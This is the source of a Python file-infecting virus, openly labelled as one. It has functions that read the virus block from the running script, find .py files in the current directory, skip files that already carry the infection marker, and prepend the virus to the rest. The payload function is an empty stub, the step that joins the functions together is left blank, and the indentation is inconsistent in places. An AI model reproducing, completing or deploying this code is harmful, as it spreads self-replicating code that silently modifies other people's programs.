#!/usr/bin/env python
 
##### VIRUS BEGIN #####
import os, glob, sys, re
 
def getVirusFromSelf():
    "getVirusFromSelf - Returns the lines of the virus in a list"
    code = []
   fileHandle = open(sys.argv[0], "r")
   inVirus = False
   while 1:
       line = fileHandle.readline()
       if not line: break
       if re.search("^##### VIRUS BEGIN #####", line): inVirus = True
       if inVirus: code.append(line)
       if re.search("^##### VIRUS END #####", line): break
   fileHandle.close()
   return code
 
def getPythonList():
   "getPythonList - Return a list of Python programs"
   progs = glob.glob("*.py")
   return progs
 
def readFile(filename):
   "readFile - Returns a list of lines in a file"
   fileHandle = open(filename, "r")
   code = []
   while 1:
       line = fileHandle.readline()
       if not line: break
       code.append(line)
   fileHandle.close()
   return code
 
def isInfected(code):
   "isInfected - Returns True if infected, False if not"
   for line in code:
       if re.search("^##### VIRUS BEGIN #####", line): return True
   return False
 
def infectCode(progCode, virusCode):
   "infectCode - Inserts the virusCode into the progCode"
   code = []
   if re.search("^#!", progCode[0]): code.append(progCode.pop(0))
   for line in virusCode: code.append(line)
   for line in progCode: code.append(line)
   return code
 
def writeFile(filename, code):
   "writeFile - Write the lines in a list of code to a filename"
   fileHandle = open(filename, "w")
   for line in code:
       fileHandle.write(line)
   fileHandle.close()
 
def virusPayload():
   "virusPayload - Function for what the virus should do"
   pass
 
## Put functions together here ##
 
 
##### VIRUS END #####